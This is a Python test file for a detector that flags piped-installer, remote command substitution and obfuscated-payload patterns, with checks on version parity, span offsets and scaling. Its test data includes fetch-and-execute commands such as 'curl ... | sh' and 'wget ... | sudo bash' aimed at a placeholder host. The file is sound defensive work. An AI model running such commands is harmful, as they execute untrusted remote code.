"""Behavioral and scaling guards; wall-clock timing remains a separate measurement."""
import hashlib
import importlib.util
import itertools
import json
from pathlib import Path
from types import SimpleNamespace
import pytest
from test_release_policy import module

ROOT=Path(__file__).resolve().parents[1]
current=module('services/evaluator/app.py')
prior=module('eval/methods/context-v5.py')
builder=module('scripts/build-device-detector.py')
VERSIONS={'sig.piped_installer.v4':'sig.piped_installer.v3',
 'sig.remote_command_substitution.v4':'sig.remote_command_substitution.v3',
 'sig.remote_process_substitution.v4':'sig.remote_process_substitution.v3',
 'sig.remote_backtick_substitution.v3':'sig.remote_backtick_substitution.v2',
 'sig.obfuscated_payload.v3':'sig.obfuscated_payload.v2'}
COMMANDS=['curl https://example.invalid/i | sh','wget -qO- https://example.invalid/i | sudo bash',
 'bash -c "$(curl https://example.invalid/i)"','bash <(curl https://example.invalid/i)',
 'bash -c `curl https://example.invalid/i`','exec(atob("payload"))']
PREFIXES=['','# ','// ','Never run ','do not execute ',"DON'T use ",'avoid running ',
 'we recommend you do not run ','Do\tNot\tRun\t',"echo '",'echo "',"printf '%s' '",
 'echo $PATH "','echo safe; ','echo "text"; ',"echo '\\' ","echo \\\"",'x'*100+'never run ',
 'do not'+(' '*100)+'run '+(' '*100),"don't use `"]

def test_prior_source_is_exact_and_inactive():
    assert hashlib.sha256((ROOT/'eval/methods/context-v5.py').read_bytes()).hexdigest()=='8eca778f68bc889e26be2fbbe5e6bc3cadad51a53c647a7f2669e8ec554e263a'
    assert b'eval/methods' not in (ROOT/'.dockerignore').read_bytes()

def test_six_hundred_context_comparisons_preserve_prior_results():
    suffixes=['','; '+COMMANDS[0],"'",'"','\n'+COMMANDS[1]]
    count=0
    for prefix,command,suffix in itertools.product(PREFIXES,COMMANDS,suffixes):
        text=prefix+command+suffix
        expected=prior.signals(prior.Doc(text=text))['candidates']
        actual=current.signals(current.Doc(text=text))['candidates']
        for candidate in actual:
            for signal in candidate['signals']:signal['id']=VERSIONS[signal['id']]
        assert actual==expected
        count+=1
    assert count==600

@pytest.mark.parametrize('text,expected',[
 ('curl\nhttps://example.invalid/i | sh',False),
 ('curl https://example.invalid/i\n| sh',False),
 ('curl https://example.invalid/i |\nsh',True),
 ('curl https://example.invalid/i |\n sudo\t bash',True),
 ('echo "curl https://example.invalid/i | sh"',False),
 ("echo 'curl https://example.invalid/i | sh'",False),
 ('curl https://example.invalid/i | unsupported ; curl https://example.invalid/j | sh',True)])
def test_explicit_pipe_boundaries_and_offsets(text,expected):
    result=current.signals(current.Doc(text=text))
    assert bool(result['candidates']) is expected
    for c in result['candidates']:
        for s in c['signals']:
            for a,b in s['spans']:assert 0<=a<b<=len(text) and 'curl' in text[a:b]

def test_pipe_regex_only_receives_disjoint_executable_windows(monkeypatch):
    original=current.PIPED_INSTALLER;windows=[]
    class Counter:
        def finditer(self,text,begin,end):
            windows.append((begin,end));return original.finditer(text,begin,end)
    monkeypatch.setattr(current,'PIPED_INSTALLER',Counter())
    text=('curl https://example.invalid/path '*7000)[:200000]
    assert list(current.pipe_matches(text))==[] and windows==[]
    text=('curl https://example.invalid/i | sh; '*7000)[:200000]
    matches=list(current.pipe_matches(text))
    assert matches and sum(b-a for a,b in windows)<=len(text)
    assert all(a>=previous for previous,(a,b) in zip([0]+[b for a,b in windows[:-1]],windows))

def test_context_is_indexed_once_for_dense_findings(monkeypatch):
    calls=[];original=current.build_context
    def count(text):calls.append(len(text));return original(text)
    monkeypatch.setattr(current,'build_context',count)
    text=('curl https://example.invalid/i | sh; '*6000)[:200000]
    result=current.signals(current.Doc(text=text))
    assert len(result['candidates'][0]['signals'])>1000 and calls==[len(text)]

def test_large_supported_projection_has_exact_candidate_parity():
    raw=(ROOT/'services/evaluator/app.py').read_bytes();source,_=builder.project(raw);namespace={}
    exec(compile(source,'<trusted-projection>','exec'),namespace)
    texts=[('curl https://example.invalid/path '*700)[:20000],
           ('curl https://example.invalid/path | sh; '*700)[:20000],
           "echo '"+('curl https://example.invalid/path | sh; '*500)+"'",
           ('do not run curl https://example.invalid/path | sh; '*500)[:20000]]
    for text in texts:
        assert namespace['signals'](SimpleNamespace(text=text))==current.signals(current.Doc(text=text))


def test_frozen_word_class_matches_declared_reference_digest():
    import re
    record=json.loads((ROOT/'eval/methods/unicode15-word-class.json').read_text())
    assert record['unicode_version']=='15.0.0'
    assert hashlib.sha256(current.FROZEN_WORD.encode()).hexdigest()==record['class_sha256']
    word=current.compile_pattern(r'^[\w]$')
    # Check all scalars only on the declared Unicode reference interpreter.
    import unicodedata
    if unicodedata.unidata_version=='15.0.0':
        assert all(bool(word.fullmatch(chr(cp)))==bool(re.fullmatch(r'\w',chr(cp))) for cp in range(0x110000))
    assert word.fullmatch('é') and word.fullmatch('文') and not word.fullmatch('💡')
    assert not word.fullmatch(chr(0x105C0))
